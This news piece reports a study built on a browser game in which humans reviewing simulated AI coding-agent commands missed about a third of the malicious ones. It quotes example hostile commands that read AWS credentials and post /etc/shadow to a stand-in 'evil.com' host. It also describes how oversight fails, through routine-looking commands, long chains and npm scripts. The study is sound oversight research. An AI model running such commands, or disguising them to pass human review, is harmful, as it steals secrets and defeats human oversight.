Humans missed one in three malicious AI agent commands in permission game

News time: 2026-08-07T04:02:59.122283+00:00 · Source: hackernews

A recent empirical study using a publicly available browser game reveals a sobering gap in human oversight of AI agents: across over 40,000 gameplay sessions and 409,000 command-approval decisions, participants failed to detect approximately 33% of intentionally malicious commands issued by simulated LLM-powered coding agents.

The game — called the 'AI Agent Permission Game' — places players in the role of a human-in-the-loop reviewing terminal commands proposed by an AI assistant. Players must quickly approve or deny each command under time pressure. Benign actions include 'git status' or 'npm test', while dangerous ones mimic real-world threats — like 'cat ~/.aws/credentials' or 'curl -X POST https://evil.com/leak —data-binary @/etc/shadow'. A warning banner reminds players that some commands are harmful, but no further context or explanations are provided.

The results show consistent failure patterns: users frequently approved high-risk commands, especially those disguised as routine operations or embedded in long command chains. Notably, commands involving npm run scripts — which often execute arbitrary code — were routinely overlooked, even when they triggered network calls to external domains. The game’s creator, Scale X, emphasizes this isn’t about individual incompetence, but about systemic design flaws: time pressure, ambiguous phrasing, lack of contextual metadata (e.g., command provenance or intent), and permission fatigue all erode vigilance.

Critics rightly point out limitations: the game lacks real-world stakes, uses artificial time constraints, and includes prompts whose risk level is debatable — for example, whether 'rm -rf node_modules' should always be flagged depends on context. Still, the scale of participation (196 comments, diverse professional backgrounds) and consistency of the 33% miss rate suggest these aren’t edge-case failures. Instead, they reflect how easily human judgment degrades under the cognitive load of rapid, low-context, high-volume agent approvals — a scenario already unfolding in developer tooling, CI/CD pipelines, and enterprise automation platforms.
